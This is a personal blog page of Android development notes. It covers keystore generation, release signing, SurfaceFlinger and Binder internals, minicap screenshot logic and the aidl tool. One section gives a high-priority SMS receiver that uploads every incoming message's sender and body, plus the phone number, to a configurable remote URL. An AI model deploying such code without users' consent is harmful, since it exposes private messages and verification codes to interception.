+++
title = "About Android"
description = "try to develop an andorid app"
tags = [
    "android"
]
date = "2018-01-02"
topics = [
    "android"
]
toc = true
+++

☯☯☯☯ android开发 →AF  android测试开发，懂测试，懂开发；懂测试开发；懂android开发。

## Android APK

### 生成签名文件

```
# need java JDK environment
# keytool --help
# keytool -genkey -help
 ~ keytool -genkey -alias gebitang.keystore -keyalg RSA -validity 20000 -keystore ./gebitang.keystore
Enter keystore password:
Re-enter new password:
What is your first and last name?
  [Unknown]:  JOECHINLEE
What is the name of your organizational unit?
  [Unknown]:  gebitang
What is the name of your organization?
  [Unknown]:  geb
What is the name of your City or Locality?
  [Unknown]:  Beijing
What is the name of your State or Province?
  [Unknown]:  Beijing
What is the two-letter country code for this unit?
  [Unknown]:  cn
Is CN=JOECHINLEE, OU=gebitang, O=geb, L=Beijing, ST=Beijing, C=cn correct?
  [no]:
What is your first and last name?
  [JOECHINLEE]:
What is the name of your organizational unit?
  [gebitang]:
What is the name of your organization?
  [geb]:
What is the name of your City or Locality?
  [Beijing]:
What is the name of your State or Province?
  [Beijing]:
What is the two-letter country code for this unit?
  [cn]:
Is CN=JOECHINLEE, OU=gebitang, O=geb, L=Beijing, ST=Beijing, C=cn correct?
  [no]:  yes

Enter key password for <gebitang.keystore>
  (RETURN if same as keystore password):
```

### 签名、打包release版本

[Android Studio的两种模式及签名配置](https://www.cnblogs.com/details-666/p/keystore.html)

- 使用release版本 by Build Variants 

### 静态变量失效，数据保存

实际使用中发现静态变量赋值后再次使用时依然是原始默认值。建议[使用Shared Preferences](https://stackoverflow.com/a/10962472/1087122)或者统一定义 [Application](https://stackoverflow.com/a/8504129/1087122)中。

### 读取短信信息，动态请求权限

- [动态请求读取短信权限](https://android.jlelse.eu/detecting-sending-sms-on-android-8a154562597f) - pending

设置[android:priority](https://developer.android.com/guide/topics/manifest/intent-filter-element.html)，
```
# AndroidManifest.xml
<receiver
    android:name=".SmsBroadcastReceiver"
    android:enabled="true"
    android:exported="true">
    <intent-filter android:priority="1000">
        <action android:name="android.provider.Telephony.SMS_RECEIVED" />
    </intent-filter>
</receiver>

#发送短信
public class SmsBroadcastReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        sendSms(context, intent);
    }
}

# actual method
void sendSms(Context context, Intent intent) {
  if (Telephony.Sms.Intents.SMS_RECEIVED_ACTION.equals(intent.getAction())) {
      String smsSender = "";
      StringBuilder sb = new StringBuilder();
      if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
          for (SmsMessage smsMessage : Telephony.Sms.Intents.getMessagesFromIntent(intent)) {
              smsSender = smsMessage.getDisplayOriginatingAddress();
              sb.append(smsMessage.getMessageBody());
          }
      } else {
          Bundle smsBundle = intent.getExtras();
          if (smsBundle != null) {
              Object[] pdus = (Object[]) smsBundle.get("pdus");
              if (pdus == null) {
                  // Display some error to the user
                  Log.e(Utils.tag, "SmsBundle had no pdus key");
                  return;
              }
              SmsMessage[] messages = new SmsMessage[pdus.length];
              for (int i = 0; i < messages.length; i++) {
                  messages[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
                  sb.append(messages[i].getMessageBody());
              }
              smsSender = messages[0].getOriginatingAddress();
          }
      }
      SharedPreferences settings = context.getSharedPreferences(Const.SAVE_DATE, 0);
      String phone = settings.getString(Const.phoneNum, SmsHelper.getPhoneNumber());
      String url = settings.getString(Const.smsUrl, SmsHelper.getReceiveSmsUrl());
      //Log.i(Utils.tag,  url+ " now phone number: " + phone);
      HttpClientUtil.uploadSmsInBackground(smsSender, sb.toString(), phone, url);
  }
```



## Android Surface System

Bn: BinderNative</br>
Bp: BinderProxy</br>
Java上层利用binder调用C++层的bn端，而后C++的bn端再将请求返回给上层

BpBinder binder的proxy端</br>
BBinder 与BpBinder对应的端

```
main_surfaceflinger.cpp	
SurfaceFlinger::publishAndJoinThreadPool();
```
```
/**--------------------
 * Base class and low-level protocol for a remotable object.
 * You can derive from this class to create an object for which other
 * processes can hold references to it.  Communication between processes
 * (method calls, property get and set) is down through a low-level
 * protocol implemented on top of the transact() API.
 */
class IBinder : public virtual RefBase


/*--------------------
 * This class defines the Binder IPC interface for accessing various
 * SurfaceFlinger features.
 */
class ISurfaceComposer: public IInterface

/*--------------------
 * This class defines the Binder IPC interface for the producer side of
 * a queue of graphics buffers.  It's used to send graphics data from one
 * component to another.  For example, a class that decodes video for
 * playback might use this to provide frames.  This is typically done
 * indirectly, through Surface.
 *
 * The underlying mechanism is a BufferQueue, which implements
 * BnGraphicBufferProducer.  In normal operation, the producer calls
 * dequeueBuffer() to get an empty buffer, fills it with data, then
 * calls queueBuffer() to make it available to the consumer.
 *
 * This class was previously called ISurfaceTexture.
 */
class IGraphicBufferProducer : public IInterface


/**********************************************************************************
 * CpuConsumer is a BufferQueue consumer endpoint that allows direct CPU
 * access to the underlying gralloc buffers provided by BufferQueue. Multiple
 * buffers may be acquired by it at once, to be used concurrently by the
 * CpuConsumer owner. Sets gralloc usage flags to be software-read-only.
 * This queue is synchronous by default.
 */

class CpuConsumer : public ConsumerBase


// ConsumerBase is a base class for BufferQueue consumer end-points. It
// handles common tasks like management of the connection to the BufferQueue
// and the buffer pool.
class ConsumerBase : public virtual RefBase,
        protected BufferQueue::ConsumerListener 
        

/*
 * This class defines the Binder IPC interface for the producer side of
 * a queue of graphics buffers.  It's used to send graphics data from one
 * component to another.  For example, a class that decodes video for
 * playback might use this to provide frames.  This is typically done
 * indirectly, through Surface.
 *
 * The underlying mechanism is a BufferQueue, which implements
 * BnGraphicBufferProducer.  In normal operation, the producer calls
 * dequeueBuffer() to get an empty buffer, fills it with data, then
 * calls queueBuffer() to make it available to the consumer.
 *
 * This class was previously called ISurfaceTexture.
 */
class IGraphicBufferProducer : public IInterface

class BufferQueue : public BnGraphicBufferProducer


```    

screencap方法的逻辑：
```
/frameworks/native/libs/gui/SurfaceComposerClient.cpp
```

### ScreenshotClient的update方法：

1. getCpuConsumer()：新建一个consumer，
2. 调用SurfaceFlinger端的captureScreen方法生成截图
3. 使用1中的consumer消费2中的截图，保存到指针mBuffer指向的内存中


### Minicap方法的逻辑：
1. 根据传递的参数设置截图信息，实际宽高、截图宽高、rotation；设置listener，传递给2中重新封装的FrameProxy
2. 应用1中的配置
    createVirtualDisplay()：
        createDisplay返回一个远程对象用来显示DisplayToken == SurfaceFlinger？</br>
        从Cpuconsumer中获取BufferQueue： BnGraphicBufferProducer，设置（图片）大小和（图片）格式。
        重新包装了一个listener—— class FrameProxy: public android::ConsumerBase::FrameAvailableListener
        consumer设置setFrameAvailableListener。class CpuConsumer : public ConsumerBase
    
    设置消费所需要用到的各个信息？最终获取到一个DisplayState 所需的内容
    android::SurfaceComposerClient::setDisplaySurface(mVirtualDisplay, mBufferQueue);
    android::SurfaceComposerClient::setDisplayProjection(mVirtualDisplay, android::DISPLAY_ORIENTATION_0, layerStackRect, visibleRect);
    android::SurfaceComposerClient::setDisplayLayerStack(mVirtualDisplay, 0); // default stack
    
    


通用逻辑：
使用surfaceComposerClient调用SurfaceFlinger中的具体实现


/frameworks/native/include/private/gui/LayerState.h
struct DisplayState


BufferQueue这个类是由应用程序在客户端通过和服务端的Client交互，提交消息给SurfaceFlinger处理时创建的Layer对象时在SurfaceTextureLayer类构造中创建的：
BufferQueue中有一个成员变量BufferSlot mSlots[NUM_BUFFER_SLOTS];即一个BufferQueue实际上最大可以有32个Buffer，即一个应用程序申请的Surface在SF端的Layer可以有32个图像缓存区。而这32个图形缓存区都有上面的mSlots维护着，每个Buffer有以下几种可变的状态，由BufferState mBufferState维护：
分别是FREE,DEQUEUED,QUEUE,ACQUIRED这4个状态，分别是空闲，出列被填充数据，入列代表有了数据，最终将入列后有了图形数据的缓冲区进行渲染。


[android的surfaceflinger原理讲解](http://blog.chinaunix.net/uid-20564848-id-96788.html)

[Android应用程序与SurfaceFlinger服务的关系概述和学习计划](http://blog.csdn.net/luoshengyang/article/details/7846923)

[Android4.2.2 SurfaceFlinger之图形缓存区申请与分配dequeueBuffer](http://blog.csdn.net/gzzaigcnforever/article/details/21892067)

[Android5.1中surface和CpuConsumer下生产者和消费者间的处理框架简述](http://blog.csdn.net/gzzaigcnforever/article/details/49025297)

[Graphics architecture](https://source.android.com/devices/graphics/architecture.html)




[SurfaceFlinger:](https://source.android.com/devices/graphics/) 

>the system service that consumes the currently visible surfaces and composites them onto the display using information provided by the Window Manager. SurfaceFlinger is the only service that can modify the content of the display. SurfaceFlinger uses OpenGL and the Hardware Composer to compose a group of surfaces.



[SurfaceFlinger](http://stackoverflow.com/a/21654896/1087122) 

>is an Android system service, responsible for compositing all the application and system surfaces into a single buffer that is finally to be displayed by display controller.

>Let's zoom in above statement.

>SurfaceFlinger is a system wide service but it is not directly available to application developer as Sensor or other services can be. Every time you want to update your UI, SurfaceFlinger will kick in. This explains why SurfaceFlinger is a battery drainer.

>Besides your application surfaces, there are system surfaces, including status bar, navigation bar and, when rotation happens, surfaces created by the system for rotation animation. Most applications have only one active surface - the one of current foreground activity, others have more than one when SurfaceView is used in the view hierarchy or Presentation mode is used.

>SurfaceFlinger is responsible for COMPOSITING all those surfaces. A common misunderstanding is that SurfaceFinger is for DRAWING. It is not correct. Drawing is the job of OpenGL. The interesting thing is SurfaceFlinger used openGL for compositing as well.

>The composition result will be put in a system buffer, or native window, which is the source for display controller to fetch data from. This is what you see in the screen.


### aidl工具：
Example：
```
F:\>aidl -IF:\android\sources\08_android-2.2\frameworks\base\core\java\ -IF:\android\sources\08_android-2.2\frameworks\base\graphics\java F:\android\sources\08_android-2.2\frameworks\base\core\java\android\view\IWindowSession.aidl testme.java
F:\>aidl -IF:\android\sources\18_android-4.3_r2.3\frameworks\base\core\java\ -IF:\android\sources\18_android-4.3_r2.3\frameworks\base\graphics\java\ F:\android\sources\18_android-4.3_r2.3\frameworks\base\core\java\android\view\IWindowSession.aidl testme18.java
```
```
F:\>aidl
INPUT required
usage: aidl OPTIONS INPUT [OUTPUT]
       aidl --preprocess OUTPUT INPUT...

OPTIONS:
   -I<DIR>    search path for import statements.
   -d<FILE>   generate dependency file.
   -a         generate dependency file next to the output file with the name based on the input file.
   -p<FILE>   file created by --preprocess to import.
   -o<FOLDER> base output folder for generated files.
   -b         fail when trying to compile a parcelable.

INPUT:
   An aidl interface file.

OUTPUT:
   The generated interface files.
   If omitted and the -o option is not used, the input filename is used, with the .aidl extension changed to a .java extension.
   If the -o option is used, the generated files will be placed in the base output folder, under their package folder
```

